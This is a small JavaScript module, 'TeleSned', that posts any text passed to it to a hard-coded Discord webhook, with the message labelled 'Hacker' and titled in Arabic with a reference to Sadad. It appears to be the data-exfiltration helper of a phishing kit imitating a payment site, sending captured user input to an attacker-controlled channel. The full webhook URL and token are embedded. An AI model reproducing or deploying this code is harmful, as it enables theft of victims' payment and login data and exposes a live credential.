import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322124927440261141/vUYLA9PIfBhVABhfyhN67Be1eoVE2twpSRWzLQwOVHQNmaE4Sb8r7XsdkvN5uvQzd9km",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
